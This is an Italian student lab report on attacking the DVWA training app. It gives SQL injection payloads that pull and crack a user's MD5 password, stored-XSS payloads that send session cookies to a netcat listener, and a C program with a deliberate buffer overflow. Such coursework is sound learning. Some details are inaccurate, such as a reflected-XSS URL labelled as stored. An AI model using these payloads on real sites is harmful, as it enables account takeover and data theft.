# 🌐 S8 Build Week 2: **REPORT OPERATIVO – CYBERCERBERUS**

## 🛠 **TRACCIA GIORNO 1: SQL Injection su DVWA (Low e Medium)**

Questa guida fornisce istruzioni passo-passo per eseguire una SQL Injection sulla piattaforma **DVWA (Damn Vulnerable Web Application)**. L'obiettivo è estrarre i dati sensibili dell'utente **Pablo** in modalità **Low** e **Medium**, e decifrare la sua password hash **MD5**.

---

## **Requisiti**

1. **DVWA Configurato**: Assicurati che la piattaforma DVWA sia correttamente installata e configurata.
2. **Accesso a un Browser o Terminale** per inviare richieste SQL Injection.
3. **Livelli di Sicurezza** configurati in DVWA:
   - **Low** per la prima parte.
   - **Medium** per la seconda parte.

---

## 🔍 **Parte 1: SQL Injection in Modalità Low**

### 🎯 **Obiettivo**
Estrarre i dati dell'utente **Pablo**, inclusa la sua password hash MD5.

![PabloLow](./Screenshots/EstraggoPablo.png)

### 📝 **Passaggi**

1. **Vai alla pagina di SQL Injection**:
   - URL: `http://<IP_DVWA>/dvwa/vulnerabilities/sqli/`

2. **Trova i dati dell'utente Pablo**:
   Inserisci il seguente payload nel campo **User ID**:
   ```sql
   ' UNION SELECT user, password FROM dvwa.users WHERE user='Pablo' -- 
   ```

3. **Risultati attesi**:
   - Nome utente: `Pablo`
   - Password hash: `0d107d09f5bbe40cade3de5c71e9e9b7`

4. **Decifra la password hash**:
   - L'hash `0d107d09f5bbe40cade3de5c71e9e9b7` corrisponde alla password `letmein`.
   - Puoi utilizzare uno strumento online come [https://crackstation.net](https://crackstation.net) per decifrare l'hash.

---

## 🔍 **Parte 2: SQL Injection in Modalità Medium**

### 🎯 **Obiettivo**
Superare i controlli di filtraggio e ottenere i dati di Pablo utilizzando payload in formato hexadecimal.

![SQLMedium](./Screenshots/SQLmedium.png)

### 📝 **Passaggi**

1. **Vai alla pagina di SQL Injection**:
   - URL: `http://<IP_DVWA>/dvwa/vulnerabilities/sqli/`

2. **Trova i dati di Pablo**:
   Usa il seguente payload nel campo **User ID**:
   ```sql
   0x27 UNION SELECT user, password FROM dvwa.users WHERE user=0x5061626c6f -- 
   ```
![PabloMedium](./Screenshots/EstraggoPabloMedium.png)

   - `0x27` è il formato hexadecimal per l'apostrofo (`'`).
   - `0x5061626c6f` è il formato hexadecimal per `Pablo`.

3. **Risultati attesi**:
   - Nome utente: `Pablo`
   - Password hash: `0d107d09f5bbe40cade3de5c71e9e9b7`

4. **Decifra la password hash**:
   - Decifra l'hash `0d107d09f5bbe40cade3de5c71e9e9b7` utilizzando uno strumento come [Crackstation](https://crackstation.net) per ottenere la password: `letmein`.

---

## 🛠 **Strumenti Utili**

1. **Siti per decifrare hash MD5**:
   - [Crackstation](https://crackstation.net)
   - [MD5 Decrypt](https://md5decrypt.net)

2. **Tool di cracking**:
   - **Hashcat**:
     ```bash
     hashcat -a 0 -m 0 hash.txt wordlist.txt
     ```
   - **John the Ripper**:
     ```bash
     john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
     ```
![John](./Screenshots/JohnMD5crack.png)

---

## **Conclusione**

Seguendo questa guida, abbiamo dimostrato come eseguire una SQL Injection su DVWA per estrarre i dati dell'utente **Pablo** e decifrare la sua password MD5 `letmein`. Questi test sottolineano l'importanza di proteggere le applicazioni web da vulnerabilità di SQL Injection.

---

## 🛡 **TRACCIA GIORNO 2: Exploit XSS Persistente su DVWA (Low e Medium)**

Questa guida illustra come sfruttare una vulnerabilità di **Cross-Site Scripting (XSS) Persistente** sulla piattaforma **DVWA (Damn Vulnerable Web Application)** in modalità **Low** e **Medium**. L'obiettivo è simulare il furto di cookie di sessione inviandoli a un server sotto il nostro controllo.

---

## **Requisiti**

1. **DVWA Installato** e configurato.
2. **Livelli di Sicurezza** impostati su **Low** e **Medium**.
3. **Server di Ascolto** su Kali Linux configurato per ricevere i cookie sulla porta **4444**.
4. Indirizzi IP:
   - **Kali Linux**: `192.168.50.165`
   - **Metasploitable**: `192.168.50.3`

---

## 🔍 **Parte 1: XSS Persistente in Modalità Low**

### 🎯 **Obiettivo**
Iniettare uno script malevolo nella web application DVWA per inviare i cookie della sessione al nostro server di ascolto.

### 📝 **Passaggi**

1. **Configura il Server di Ascolto su Kali Linux**:
   - Avvia Netcat per ricevere i cookie sulla porta 4444:
     ```bash
     nc -lvnp 4444
     ```

2. **Accedi a DVWA**:
   - Vai alla sezione **XSS Persistente**:
     ```
     http://192.168.50.3/dvwa/vulnerabilities/xss_r/
     ```

3. **Inserisci il Payload**:
   Usa il seguente script JavaScript nel campo vulnerabile (esempio: un campo commento):
   ```html
   <script>
     fetch('http://192.168.50.165:4444', {
       method: 'POST',
       body: document.cookie
     });
   </script>
   ```

4. **Esegui il Payload**:
   - Invia il payload premendo **Submit**.
   - Ogni volta che la pagina viene caricata, lo script invierà i cookie della sessione al server di ascolto.

5. **Verifica i Cookie su Kali Linux**:
   - Sul terminale di Kali Linux, dovresti vedere i cookie della sessione, ad esempio:
     ```
     PHPSESSID=abcdef1234567890; security=low
     ```
![XSSLow](./Screenshots/XSSLow.png)

---

## 🔍 **Parte 2: XSS Persistente in Modalità Medium**

### 🎯 **Obiettivo**
Aggirare i filtri di input e sfruttare la vulnerabilità XSS per ottenere i cookie della sessione.

### 📝 **Passaggi**

1. **Configura il Server di Ascolto su Kali Linux**:
   - Utilizza lo stesso comando di Netcat:
     ```bash
     nc -lvnp 4444
     ```

2. **Accedi a DVWA**:
   - Vai alla sezione **XSS Persistente**:
     ```
     http://192.168.50.3/dvwa/vulnerabilities/xss_r/
     ```

3. **Inserisci il Payload Alternativo**:
   Poiché `<script>` potrebbe essere filtrato, utilizza il seguente payload:
   ```html
   <img src="nonexistent.jpg" onerror="fetch('http://192.168.50.165:4444', {method: 'POST', body: document.cookie})">
   ```

4. **Esegui il Payload**:
   - Invia il payload premendo **Submit**.
   - Ogni volta che un utente carica la pagina, l'evento `onerror` si attiverà e invierà i cookie al server di ascolto.

5. **Verifica i Cookie su Kali Linux**:
   - Controlla il terminale e verifica i cookie ricevuti:
     ```
     PHPSESSID=abcdef1234567890; security=medium
     ```

![XSSMedium](./Screenshots/XSSMedium.png)

---

## 📌 **Spiegazione dei Payload**

### **Payload in Modalità Low**
- `<script>`: Inietta uno script JavaScript nella pagina vulnerabile.
- `document.cookie`: Recupera i cookie della sessione della vittima.
- `fetch`: Invia i cookie al server dell'attaccante tramite una richiesta HTTP POST.

### **Payload in Modalità Medium**
- `<img src="nonexistent.jpg">`: Un'immagine che non esiste attiva l'evento `onerror`.
- `onerror`: Contiene lo script malevolo per inviare i cookie.
- `fetch`: Come sopra, invia i cookie al server.

---

## 🛡 **Considerazioni di Sicurezza**

Per proteggere le applicazioni da attacchi XSS:

1. **Sanitizzazione dell'Input**:
   - Filtra e valida tutti i dati forniti dagli utenti per evitare l'iniezione di codice malevolo.
2. **Cookie HTTPOnly**:
   - Imposta i cookie di sessione come **HTTPOnly** per impedire l'accesso tramite JavaScript.
3. **Content Security Policy (CSP)**:
   - Configura una CSP per limitare l'esecuzione di script non autorizzati.

---

## 🚀 **Conclusione**

Abbiamo dimostrato come sfruttare vulnerabilità di **SQL Injection** e **XSS Persistente** su DVWA per estrarre dati sensibili e rubare cookie di sessione. Questa guida sottolinea l'importanza di implementare misure di sicurezza per prevenire tali attacchi.

Se hai bisogno di ulteriori chiarimenti o supporto, non esitare a contattarci! 🚀

---

# **Traccia 3**

## **Descrizione del programma originale**

Il programma originale è scritto in linguaggio C e permette di eseguire le seguenti operazioni:

1. **Input di 10 numeri interi**:
   - L'utente inserisce 10 numeri che vengono salvati in un array chiamato `vector`.

2. **Visualizzazione del vettore**:
   - Dopo l'inserimento, il programma stampa i numeri nella sequenza in cui sono stati forniti dall'utente.

3. **Ordinamento Bubble Sort**:
   - I numeri vengono ordinati in ordine crescente utilizzando l'algoritmo di ordinamento Bubble Sort.

4. **Visualizzazione del vettore ordinato**:
   - Dopo l'ordinamento, il programma stampa i numeri ordinati.

### **Flusso del programma originale**
1. Dichiarazione di un array di dimensione 10 (`vector[10]`).
2. Ciclo `for` per acquisire input numerico dall'utente.
3. Visualizzazione del vettore originale tramite un altro ciclo `for`.
4. Ordinamento del vettore utilizzando due cicli annidati (`Bubble Sort`).
5. Visualizzazione del vettore ordinato.

### **Esempio di output originale**
```
Inserire 10 numeri interi:
[1]: 5
[2]: 3
[3]: 7
[4]: 9
[5]: 2
[6]: 8
[7]: 4
[8]: 1
[9]: 6
[10]: 10

Il vettore inserito è:
[1]: 5
[2]: 3
[3]: 7
...

Il vettore ordinato è:
[1]: 1
[2]: 2
[3]: 3
...
```

---

## **Modifiche apportate al programma**

Il programma è stato modificato per introdurre due modalità operative selezionabili dall'utente tramite un **menù interattivo**:

1. **Modalità corretta (Programma originale):**
   - Mantiene il comportamento originale del programma.
   - Consente all'utente di inserire 10 numeri, visualizzarli e ordinarli.

2. **Modalità con errore (Simulazione di Buffer Overflow):**
   - L'utente può inserire 15 numeri, scrivendo volutamente oltre i limiti del vettore (`vector[10]`), provocando un **errore di segmentazione**.
   - Viene stampato un messaggio di errore personalizzato **"Buffer Overflow Rilevato"** prima del crash.

---

## **Passaggi seguiti per implementare la modifica**

### **1. Aggiunta di un menù interattivo**
- È stato implementato un menù che consente all'utente di scegliere tra:
  - **Opzione 1:** Modalità corretta (programmazione originale).
  - **Opzione 2:** Modalità con errore (simulazione di buffer overflow).

### **2. Gestione dell'input dell'utente**
- È stato introdotto un controllo per validare l'input del menù:
  ```c
  if (scanf("%d", &scelta) != 1 || (scelta != 1 && scelta != 2)) {
      printf("Errore: Selezione non valida. Inserire 1 o 2.\n");
      return 1;
  }
  ```

### **3. Modalità con errore**
- Modificato il ciclo di inserimento per permettere la scrittura oltre i limiti dell'array:
  ```c
  for (i = 0; i < 15; i++) {
      if (i >= 10) {
          printf("\n[!] ERRORE CRITICO: BUFFER OVERFLOW RILEVATO! (Scrittura oltre i limiti)\n");
      }
      scanf("%d", &vector[i]); // Scrive oltre i limiti
  }
  ```

### **4. Preservazione della modalità corretta**
- La funzionalità originale è stata mantenuta intatta, compreso l'algoritmo di ordinamento Bubble Sort.

---

## **Come eseguire il programma**

1. Compilare il programma utilizzando GCC:
   ```bash
   gcc programma.c -o programma
   ```
2. Eseguire il programma:
   ```bash
   ./programma
   ```
3. Selezionare l'opzione desiderata:
   - **1:** Per la modalità corretta.
   - **2:** Per provocare l'errore.

---

## **Esempio di output**

### **Modalità corretta**
```
Hai selezionato il programma corretto.
Inserire 10 numeri interi:
[1]: 5
[2]: 3
...

Il vettore inserito è:
[1]: 5
[2]: 3
...

Il vettore ordinato è:
[1]: 3
[2]: 5
...
```

### **Modalità con errore**
```
Hai selezionato il programma con errore (buffer overflow).
Inserire 15 numeri interi:
[1]: 5
[2]: 3
[3]: 7
...

[11]:
[!] ERRORE CRITICO: BUFFER OVERFLOW RILEVATO! (Scrittura oltre i limiti)
Segmentation fault (core dumped)
```

---

## **Conclusioni**

Le modifiche introdotte dimostrano il comportamento originale del programma e simulano un caso di **buffer overflow**, utile per scopi didattici. La gestione del menù consente una chiara separazione tra modalità corretta e modalità con errore.

⚠️ **Nota:** La modalità con errore provoca un comportamento indefinito ed è destinata esclusivamente a scopi di test in ambienti controllati.


